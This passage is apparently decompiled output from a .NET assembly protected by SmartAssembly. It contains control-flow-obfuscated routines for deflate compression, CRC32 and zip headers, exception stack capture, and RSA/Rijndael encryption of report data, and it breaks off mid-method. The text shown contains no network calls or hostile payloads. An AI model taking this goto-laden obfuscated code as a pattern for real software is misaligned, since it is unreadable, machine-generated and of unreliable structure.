using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using ns0;
using ns1;
using ns10;
using ns11;
using ns2;
using ns5;
using ns6;
using ns7;
using ns8;
using ns9;

internal class Class42
{
	static void smethod_0(Class15.Class25 class25_0)
	{
		if (class25_0.int_2 > 0)
		{
			class25_0.byte_0[class25_0.int_1++] = (byte)class25_0.uint_0;
			if (class25_0.int_2 > 8)
			{
				class25_0.byte_0[class25_0.int_1++] = (byte)(class25_0.uint_0 >> 8);
			}
		}
		class25_0.uint_0 = 0u;
		class25_0.int_2 = 0;
	}

	static void smethod_1(Exception exception_0, object object_0)
	{
		Class42.smethod_2(exception_0, new object[1] { object_0 });
	}

	static void smethod_2(Exception exception_0, object[] object_0)
	{
		int methodID = -1;
		int ilOffset = -1;
		int num = 0;
		StackTrace stackTrace = new StackTrace(exception_0);
		try
		{
			if (exception_0.StackTrace != null)
			{
				string[] array = exception_0.StackTrace!.Split('\r', '\n');
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text.Length > 0)
					{
						num++;
					}
				}
			}
		}
		catch
		{
			num = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				methodID = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				ilOffset = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(methodID, object_0, ilOffset, num);
			LinkedList<object> linkedList;
			if (!exception_0.Data.Contains(Class14.smethod_0(1836)))
			{
				linkedList = new LinkedList<object>();
				exception_0.Data[Class14.smethod_0(1836)] = linkedList;
			}
			else
			{
				linkedList = (LinkedList<object>)exception_0.Data[Class14.smethod_0(1836)];
			}
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static void smethod_3(byte[] byte_0, Class15.Class21 class21_0)
	{
		Class42.smethod_110(byte_0, class21_0.class24_0);
	}

	static void smethod_4(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8)
	{
		Class42.smethod_2(exception_0, new object[9] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8 });
	}

	static void smethod_5()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class42.smethod_96;
		}
		catch
		{
		}
	}

	static void smethod_6(Exception exception_0)
	{
		while (true)
		{
			if (exception_0 == null)
			{
				goto IL_0003;
			}
			int num = 1;
			if (!gW67GT4Mxy6wW4pIs8r())
			{
				break;
			}
			goto IL_001c;
			IL_0047:
			if (Class38.string_0 == Class14.smethod_0(1158) && Class38.Handler.method_2((SecurityException)exception_0))
			{
				break;
			}
			goto IL_0003;
			IL_0003:
			Class38.Handler.method_3(exception_0, bool_1: false, bool_2: false);
			num = 6;
			if (gW67GT4Mxy6wW4pIs8r())
			{
				goto IL_001c;
			}
			goto IL_003f;
			IL_001c:
			switch (num)
			{
			default:
				return;
			case 1:
				break;
			case 5:
				goto IL_0047;
			case 0:
			case 4:
				continue;
			case 2:
			case 3:
				return;
			case 6:
				return;
			}
			goto IL_003f;
			IL_003f:
			if (!(exception_0 is SecurityException))
			{
				goto IL_0003;
			}
			goto IL_0047;
		}
	}

	static bool smethod_7(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class29_0.method_7();
	}

	static int smethod_8(Class15.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static bool smethod_9(bool bool_0, bool bool_1, Class15.Class24 class24_0)
	{
		bool flag;
		do
		{
			Class42.smethod_122(class24_0);
			bool bool_2 = bool_1 && class24_0.int_7 == class24_0.int_8;
			flag = Class42.smethod_45(bool_0, class24_0, bool_2);
		}
		while (class24_0.class25_0.IsFlushed && flag);
		return flag;
	}

	static void smethod_10(Class15.Class22.Class23 class23_0)
	{
		int num = class23_0.short_0.Length;
		int[] array = new int[num];
		int num2 = 0;
		int num3 = 0;
		for (int i = 0; i < num; i++)
		{
			int num4 = class23_0.short_0[i];
			if (num4 != 0)
			{
				int num5 = num2++;
				int num6;
				while (num5 > 0 && class23_0.short_0[array[num6 = (num5 - 1) / 2]] > num4)
				{
					array[num5] = array[num6];
					num5 = num6;
				}
				array[num5] = i;
				num3 = i;
			}
		}
		while (num2 < 2)
		{
			int num7 = ((num3 < 2) ? (++num3) : 0);
			array[num2++] = num7;
		}
		class23_0.int_1 = Math.Max(num3 + 1, class23_0.int_0);
		int num8 = num2;
		int[] array2 = new int[4 * num2 - 2];
		int[] array3 = new int[2 * num2 - 1];
		int num9 = num8;
		for (int j = 0; j < num2; j++)
		{
			int num10 = (array2[2 * j] = array[j]);
			array2[2 * j + 1] = -1;
			array3[j] = class23_0.short_0[num10] << 8;
			array[j] = j;
		}
		do
		{
			int num11 = array[0];
			int num12 = array[--num2];
			int num13 = 0;
			int num14;
			for (num14 = 1; num14 < num2; num14 = num14 * 2 + 1)
			{
				if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
				{
					num14++;
				}
				array[num13] = array[num14];
				num13 = num14;
			}
			int num15 = array3[num12];
			while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
			{
				array[num14] = array[num13];
			}
			array[num14] = num12;
			int num16 = array[0];
			num12 = num9++;
			array2[2 * num12] = num11;
			array2[2 * num12 + 1] = num16;
			int num17 = Math.Min(array3[num11] & 0xFF, array3[num16] & 0xFF);
			num15 = (array3[num12] = array3[num11] + array3[num16] - num17 + 1);
			num13 = 0;
			for (num14 = 1; num14 < num2; num14 = num13 * 2 + 1)
			{
				if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
				{
					num14++;
				}
				array[num13] = array[num14];
				num13 = num14;
			}
			while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
			{
				array[num14] = array[num13];
			}
			array[num14] = num12;
		}
		while (num2 > 1);
		Class42.smethod_94(class23_0, array2);
	}

	static void smethod_11(byte[] byte_0, Class15.Class19 class19_0)
	{
		int[] array = new int[16];
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		int num9 = default(int);
		int num10 = default(int);
		int num11 = default(int);
		int num12 = default(int);
		int num16 = default(int);
		int num17 = default(int);
		while (true)
		{
			int[] array2 = new int[16];
			int num = 0;
			while (true)
			{
				int num3;
				if (num < byte_0.Length)
				{
					int num2 = byte_0[num];
					if (num2 > 0)
					{
						array[num2]++;
					}
					num++;
					num3 = 11;
					if (TclQyZ4yUTE7ipDsBqA())
					{
					}
					goto IL_0211;
				}
				num4 = 0;
				num5 = 512;
				num6 = 1;
				goto IL_01f1;
				IL_00ee:
				array2[num7] = num4 + (1 << 16 - num7);
				goto IL_00ff;
				IL_0199:
				int num8 = num4 & 0x1FF80;
				for (int i = num8; i < num9; i += 128)
				{
					class19_0.short_0[Class42.smethod_145(i)] = (short)((-num10 << 4) | num11);
					num10 += 1 << num11 - 9;
				}
				num3 = 1;
				if (!gW67GT4Mxy6wW4pIs8r())
				{
					goto IL_0142;
				}
				goto IL_0211;
				IL_0105:
				if (num12 >= byte_0.Length)
				{
					return;
				}
				num7 = byte_0[num12];
				if (num7 != 0)
				{
					num4 = array2[num7];
					int num13 = Class42.smethod_145(num4);
					if (num7 <= 9)
					{
						do
						{
							class19_0.short_0[num13] = (short)((num12 << 4) | num7);
							num13 += 1 << num7;
						}
						while (num13 < 512);
						num3 = 6;
						if (gW67GT4Mxy6wW4pIs8r())
						{
							goto IL_0211;
						}
					}
					else
					{
						int num14 = class19_0.short_0[num13 & 0x1FF];
						int num15 = 1 << (num14 & 0xF);
						num14 = -(num14 >> 4);
						do
						{
							class19_0.short_0[num14 | (num13 >> 9)] = (short)((num12 << 4) | num7);
							num13 += 1 << num7;
						}
						while (num13 < num15);
					}
					goto IL_00ee;
				}
				goto IL_00ff;
				IL_00ff:
				num12++;
				goto IL_0105;
				IL_0211:
				switch (num3)
				{
				case 6:
					break;
				case 8:
					goto IL_00ff;
				case 14:
					goto IL_0105;
				case 7:
					goto IL_0119;
				case 4:
					goto IL_012e;
				default:
					goto IL_0142;
				case 0:
					goto IL_0174;
				case 5:
					goto IL_0199;
				case 3:
				case 10:
					goto IL_01f1;
				case 1:
					num11--;
					goto IL_0174;
				case 2:
				case 11:
				case 12:
					continue;
				case 13:
					goto end_IL_0265;
				}
				goto IL_00ee;
				IL_0119:
				num4 += array[num6] << 16 - num6;
				if (num6 >= 10)
				{
					goto IL_012e;
				}
				goto IL_0153;
				IL_012e:
				num16 = array2[num6] & 0x1FF80;
				num17 = num4 & 0x1FF80;
				goto IL_0142;
				IL_0153:
				num6++;
				goto IL_01f1;
				IL_01f1:
				if (num6 <= 15)
				{
					array2[num6] = num4;
					goto IL_0119;
				}
				class19_0.short_0 = new short[num5];
				num10 = 512;
				num11 = 15;
				goto IL_0174;
				IL_0142:
				num5 += num17 - num16 >> 16 - num6;
				goto IL_0153;
				IL_0174:
				if (num11 >= 10)
				{
					num9 = num4 & 0x1FF80;
					num4 -= array[num11] << 16 - num11;
					goto IL_0199;
				}
				num12 = 0;
				goto IL_0105;
				continue;
				end_IL_0265:
				break;
			}
		}
	}

	static void smethod_12(Exception exception_0, object object_0, object object_1, object object_2)
	{
		Class42.smethod_2(exception_0, new object[3] { object_0, object_1, object_2 });
	}

	static object smethod_13(object object_0, string string_0)
	{
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class13.SubkeyApplication);
		if (registryKey == null)
		{
			return object_0;
		}
		return registryKey.GetValue(string_0, object_0);
	}

	[DllImport("kernel32.Dll")]
	internal static extern short GetVersionEx(ref Class41.Struct15 struct15_0);

	static void smethod_14(Class15.Class22 class22_0)
	{
		for (int i = 0; i < class22_0.int_1; i++)
		{
			int num = class22_0.byte_1[i] & 0xFF;
			int num2 = class22_0.short_0[i];
			if (num2-- != 0)
			{
				int num3 = Class42.smethod_60(num, class22_0);
				Class42.smethod_35(class22_0.class23_0, num3);
				int num4 = (num3 - 261) / 4;
				if (num4 > 0 && num4 <= 5)
				{
					Class42.smethod_20(class22_0.class25_0, num & ((1 << num4) - 1), num4);
				}
				int num5 = Class42.smethod_119(class22_0, num2);
				Class42.smethod_35(class22_0.class23_1, num5);
				num4 = num5 / 2 - 1;
				if (num4 > 0)
				{
					Class42.smethod_20(class22_0.class25_0, num2 & ((1 << num4) - 1), num4);
				}
			}
			else
			{
				Class42.smethod_35(class22_0.class23_0, num);
			}
		}
		Class42.smethod_35(class22_0.class23_0, 256);
	}

	static Icon smethod_15()
	{
		int int_ = 0;
		int int_2 = 0;
		int num = ExtractIconEx(Application.get_ExecutablePath(), -1, ref int_2, ref int_2, 1);
		if (num > 0)
		{
			ExtractIconEx(Application.get_ExecutablePath(), 0, ref int_, ref int_2, 1);
			if (int_ != 0)
			{
				return Icon.FromHandle(new IntPtr(int_));
			}
		}
		return null;
	}

	static void smethod_16(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = null;
		control0_0.bool_0 = false;
		control0_0.string_0 = string.Empty;
		((Control)control0_0).Refresh();
		((Control)control0_0).set_Height(16);
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long ShowWindowAsync(long long_0, long long_1);

	static void smethod_17(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8, object object_9)
	{
		Class42.smethod_2(exception_0, new object[10] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8, object_9 });
	}

	static bool smethod_18(string string_0, EventArgs1 eventArgs1_0)
	{
		if (File.Exists(string_0))
		{
			File.Delete(string_0);
		}
		return Class42.smethod_43(eventArgs1_0.class29_0, string_0);
	}

	static void smethod_19()
	{
		try
		{
			Class42.smethod_5();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_20(Class15.Class25 class25_0, int int_0, int int_1)
	{
		class25_0.uint_0 |= (uint)(int_0 << class25_0.int_2);
		while (true)
		{
			class25_0.int_2 += int_1;
			if (class25_0.int_2 < 16)
			{
				break;
			}
			class25_0.byte_0[class25_0.int_1++] = (byte)class25_0.uint_0;
			if (gW67GT4Mxy6wW4pIs8r())
			{
				switch (3)
				{
				case 0:
				case 4:
					break;
				case 1:
				case 3:
					class25_0.byte_0[class25_0.int_1++] = (byte)(class25_0.uint_0 >> 8);
					goto IL_00a2;
				default:
					goto IL_00a2;
				case 5:
					goto IL_00b1;
				}
				continue;
			}
			goto IL_00a2;
			IL_00a2:
			class25_0.uint_0 >>= 16;
			goto IL_00b1;
			IL_00b1:
			class25_0.int_2 -= 16;
			break;
		}
	}

	static int smethod_21(Class15.Class18 class18_0, Class15.Class17 class17_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class18_0.int_1), class17_0.AvailableBytes);
		while (true)
		{
			IL_00aa:
			int num = 32768 - class18_0.int_0;
			int num2;
			if (int_0 <= num)
			{
				num2 = Class42.smethod_129(class17_0, class18_0.byte_0, class18_0.int_0, int_0);
			}
			else
			{
				num2 = Class42.smethod_129(class17_0, class18_0.byte_0, class18_0.int_0, num);
				if (num2 == num)
				{
					goto IL_007b;
				}
			}
			goto IL_0038;
			IL_0038:
			while (true)
			{
				class18_0.int_0 = (class18_0.int_0 + num2) & 0x7FFF;
				if (!TclQyZ4yUTE7ipDsBqA())
				{
					switch (3)
					{
					case 0:
					case 1:
						goto end_IL_0038;
					case 5:
						goto IL_00aa;
					case 3:
						class18_0.int_1 += num2;
						goto IL_00d1;
					case 6:
						goto IL_00d1;
					}
					continue;
				}
				goto IL_00d1;
				IL_00d1:
				return num2;
				continue;
				end_IL_0038:
				break;
			}
			goto IL_007b;
			IL_007b:
			num2 += Class42.smethod_129(class17_0, class18_0.byte_0, 0, int_0 - num);
			goto IL_0038;
		}
	}

	static byte[] smethod_22(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class42.smethod_40(byte_1, byte_0, 2, byte_2);
	}

	[DllImport("user32.dll")]
	internal static extern int GetSystemMetrics(int int_0);

	[DllImport("kernel32.Dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long ReadConsoleInputA(long long_0, ref IntPtr intptr_0, long long_1, ref long long_2);

	static byte[] smethod_23(byte[] byte_0, string string_0)
	{
		if (string_0.StartsWith(Class14.smethod_0(1248)))
		{
			Class27.string_0 = Class14.smethod_0(3231);
			return null;
		}
		RijndaelManaged rijndaelManaged = null;
		RSACryptoServiceProvider rSACryptoServiceProvider = null;
		MemoryStream memoryStream = null;
		CryptoStream cryptoStream = null;
		try
		{
			rijndaelManaged = new RijndaelManaged();
			rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(string_0);
			rijndaelManaged.GenerateKey();
			rijndaelManaged.GenerateIV();
			byte[] array = new byte[48];
			Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
			Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
			memoryStream = new MemoryStream();
			try
			{
				byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
				memoryStream.WriteByte(1);
				memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
				memoryStream.Write(array2, 0, array2.Length);
			}
			catch (CryptographicException)
			{
				try
				{
					byte[] array3 = new byte[16];
					byte[] array4 = new byte[16];
					Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
					Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
					byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
					byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
					memoryStream.WriteByte(2);
					memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
					memoryStream.Write(array5, 0, array5.Length);
					memoryStream.Write(array6, 0, array6.Length);
					memoryStream.Write(array7, 0, array7.Length);
				}
				catch (CryptographicException)
				{
					Class27.string_0 = Class14.smethod_0(3324);
					return null;
				}
			}
			cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch (Exception ex3)
		{
			Class27.string_0 = Class14.smethod_0(3530) + ex3.Message;
			return null;
		}
		finally
		{
			rijndaelManaged?.Clear();
			rSACryptoServiceProvider?.Clear();
			memoryStream?.Close();
			cryptoStream?.Close();
		}
	}

	static Assembly[] smethod_24(Class29 class29_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class42.smethod_134() };
		}
	}

	static void smethod_25(Class15.Class17 class17_0)
	{
		class17_0.uint_0 >>= class17_0.int_2 & 7;
		class17_0.int_2 &= -8;
	}

	static int smethod_26(string string_0, int int_0, Graphics graphics_0, Font font_0)
	{
		try
		{
			return Class42.smethod_66(string_0, font_0, int_0, graphics_0);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)Class42.smethod_62(int_0, string_0, graphics_0, font_0) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	static void smethod_27(Class15.Class18 class18_0, int int_0, int int_1)
	{
		if ((class18_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class18_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class18_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class18_0.byte_0, num, class18_0.byte_0, class18_0.int_0, int_0);
				class18_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class18_0.byte_0[class18_0.int_0++] = class18_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class42.smethod_149(class18_0, num, int_0, int_1);
		}
	}

	static void smethod_28(Class15.Class22.Class23 class23_0, Class15.Class22.Class23 class23_1)
	{
		int num = -1;
		int num2 = 0;
		if (!gW67GT4Mxy6wW4pIs8r())
		{
			goto IL_00a7;
		}
		switch (2)
		{
		case 8:
			break;
		case 4:
			goto IL_008d;
		case 3:
			goto IL_009e;
		default:
			goto IL_00a7;
		case 0:
		case 2:
		case 6:
		case 7:
		case 9:
			goto IL_012f;
		}
		goto IL_0065;
		IL_0085:
		int num3 = default(int);
		num = num3;
		num2++;
		goto IL_00a7;
		IL_012f:
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		if (num2 < class23_0.int_1)
		{
			num4 = 1;
			num3 = class23_0.byte_0[num2];
			if (num3 == 0)
			{
				num5 = 138;
				num6 = 3;
				goto IL_0085;
			}
			num5 = 6;
			num6 = 3;
			goto IL_0065;
		}
		return;
		IL_009e:
		if (++num4 < num5)
		{
			goto IL_00a7;
		}
		goto IL_00b0;
		IL_00b0:
		if (num4 < num6)
		{
			class23_1.short_0[num] += (short)num4;
		}
		else if (num != 0)
		{
			class23_1.short_0[16]++;
		}
		else if (num4 <= 10)
		{
			class23_1.short_0[17]++;
		}
		else
		{
			class23_1.short_0[18]++;
		}
		goto IL_012f;
		IL_008d:
		if (num != class23_0.byte_0[num2])
		{
			goto IL_00b0;
		}
		num2++;
		goto IL_009e;
		IL_0065:
		if (num != num3)
		{
			class23_1.short_0[num3]++;
			num4 = 0;
		}
		goto IL_0085;
		IL_00a7:
		if (num2 < class23_0.int_1)
		{
			goto IL_008d;
		}
		goto IL_00b0;
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void smethod_29(Class38 class38_0)
	{
		if (class38_0 != null)
		{
			Class38.class38_0 = class38_0;
			AppDomain.CurrentDomain.UnhandledException += class38_0.method_1;
			Application.add_ThreadException((ThreadExceptionEventHandler)class38_0.method_0);
		}
	}

	static Type smethod_30(Class33 class33_0)
	{
		return class33_0.type_0;
	}

	static void smethod_31(object[] object_0, Exception exception_0)
	{
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception) && exception_0.Message == Class14.smethod_0(3547))
			{
				exception_0 = exception_0.InnerException;
			}
			else
			{
				Class42.smethod_2(exception_0, object_0);
			}
			Class38.Handler.method_3(exception_0, bool_1: true, bool_2: true);
		}
		catch
		{
		}
	}

	static Icon smethod_32()
	{
		try
		{
			return Class42.smethod_15();
		}
		catch (Exception)
		{
			return Class42.smethod_127(Class14.smethod_0(3560));
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static ICryptoTransform smethod_33(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	static int smethod_34(Class15.Class17 class17_0, int int_0)
	{
		if (class17_0.int_2 < int_0)
		{
			if (class17_0.int_0 == class17_0.int_1)
			{
				return -1;
			}
			class17_0.uint_0 |= (uint)(((class17_0.byte_0[class17_0.int_0++] & 0xFF) | ((class17_0.byte_0[class17_0.int_0++] & 0xFF) << 8)) << class17_0.int_2);
			class17_0.int_2 += 16;
		}
		return (int)(class17_0.uint_0 & ((1 << int_0) - 1));
	}

	static void smethod_35(Class15.Class22.Class23 class23_0, int int_0)
	{
		Class42.smethod_20(class23_0.class22_0.class25_0, class23_0.short_1[int_0] & 0xFFFF, (int)class23_0.byte_0[int_0]);
	}

	static void smethod_36(Class15.Class22 class22_0)
	{
		class22_0.int_1 = 0;
		class22_0.int_2 = 0;
	}

	static void smethod_37(Class15.Class17 class17_0)
	{
		int num = 0;
		class17_0.int_2 = 0;
		int num2 = 0;
		class17_0.int_1 = 0;
		int num3 = 0;
		class17_0.int_0 = 0;
		class17_0.uint_0 = 0u;
	}

	static void smethod_38()
	{
		string text = Class14.smethod_0(187);
	}

	static int smethod_39(string string_0, Class29 class29_0)
	{
		try
		{
			bool flag = class29_0.char_0[0] == '\u0001';
			int num = default(int);
			int num2 = default(int);
			bool flag2 = default(bool);
			int i = default(int);
			char c = default(char);
			while (string_0 != null && string_0.Length != 0 && (!flag || string_0.Length <= 4))
			{
				while (true)
				{
					IL_0072:
					if (!flag)
					{
						while (string_0[0] != '#')
						{
							if (gW67GT4Mxy6wW4pIs8r())
							{
								switch (3)
								{
								case 2:
								case 4:
									break;
								case 1:
									goto IL_0072;
								case 0:
								case 5:
									goto end_IL_0072;
								case 6:
									goto IL_00b5;
								case 8:
									goto IL_00d5;
								default:
									goto IL_00de;
								case 9:
									goto IL_00e1;
								case 3:
									goto end_IL_0077;
								}
								continue;
							}
							goto IL_00b5;
						}
					}
					num = 0;
					num2 = string_0.Length - 1;
					goto IL_008b;
					IL_00d5:
					if (flag2)
					{
						num2--;
						goto IL_008b;
					}
					return -1;
					IL_00b5:
					for (; i < class29_0.char_0.Length; i++)
					{
						if (class29_0.char_0[i] == c)
						{
							num = num * class29_0.char_0.Length + i;
							flag2 = true;
							break;
						}
					}
					goto IL_00d5;
					IL_008b:
					if (num2 >= 0)
					{
						if (flag)
						{
							goto IL_0092;
						}
						goto IL_00de;
					}
					goto IL_00e1;
					IL_00e1:
					return num;
					IL_00de:
					if (num2 != 0)
					{
						goto IL_0092;
					}
					goto IL_00e1;
					IL_0092:
					c = string_0[num2];
					flag2 = false;
					i = 0;
					goto IL_00b5;
					continue;
					end_IL_0072:
					break;
				}
				continue;
				end_IL_0077:
				break;
			}
			return -1;
		}
		catch
		{
			return -1;
		}
	}

	static byte[] smethod_40(byte[] byte_0, byte[] byte_1, int int_0, byte[] byte_2)
	{
		try
		{
			Class15.Stream0 stream = new Class15.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class15.Class21 class2 = new Class15.Class21();
				DateTime now = DateTime.Now;
				long num3 = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				uint num4 = uint.MaxValue;
				uint num5 = uint.MaxValue;
				int num6 = 0;
				int num7 = byte_2.Length;
				while (--num7 >= 0)
				{
					num5 = array8[(num5 ^ byte_2[num6++]) & 0xFF] ^ (num5 >> 8);
				}
				num5 ^= num4;
				Class42.smethod_54(67324752, stream);
				Class42.smethod_46(stream, 20);
				Class42.smethod_46(stream, 0);
				Class42.smethod_46(stream, 8);
				Class42.smethod_54((int)num3, stream);
				Class42.smethod_54((int)num5, stream);
				long position3 = stream.Position;
				Class42.smethod_54(0, stream);
				Class42.smethod_54(byte_2.Length, stream);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class42.smethod_46(stream, bytes.Length);
				Class42.smethod_46(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class42.smethod_3(byte_2, class2);
				while (!class2.IsNeedingInput)
				{
					byte[] array9 = new byte[512];
					int num8 = Class42.smethod_118(array9, class2);
					if (num8 <= 0)
					{
						break;
					}
					stream.Write(array9, 0, num8);
				}
				Class42.smethod_159(class2);
				while (!class2.IsFinished)
				{
					byte[] array10 = new byte[512];
					int num9 = Class42.smethod_118(array10, class2);
					if (num9 <= 0)
					{
						break;
					}
					stream.Write(array10, 0, num9);
				}
				long totalOut = class2.TotalOut;
				Class42.smethod_54(33639248, stream);
				Class42.smethod_46(stream, 20);
				Class42.smethod_46(stream, 20);
				Class42.smethod_46(stream, 0);
